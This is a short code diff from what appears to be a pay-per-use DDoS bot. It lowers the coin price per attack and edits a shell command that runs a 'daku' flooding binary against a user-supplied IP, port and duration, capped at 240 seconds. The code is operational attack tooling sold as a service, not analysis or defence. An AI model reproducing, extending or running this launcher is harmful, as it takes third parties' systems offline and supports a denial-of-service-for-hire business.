@@ -16,7 +16,7 @@ DB_NAME = "dake"
 COLLECTION_NAME = "users"
 attack_in_progress = False
 ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
-COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
+COINS_REQUIRED_PER_ATTACK = 3  # Coins required for an attack
 
 # MongoDB setup
 mongo_client = AsyncIOMotorClient(MONGO_URI)
@@ -181,7 +181,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./daku {ip} {port} {duration} {100} {1000}"
+        command = f"./daku {ip} {port} {duration} {9} {1000}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
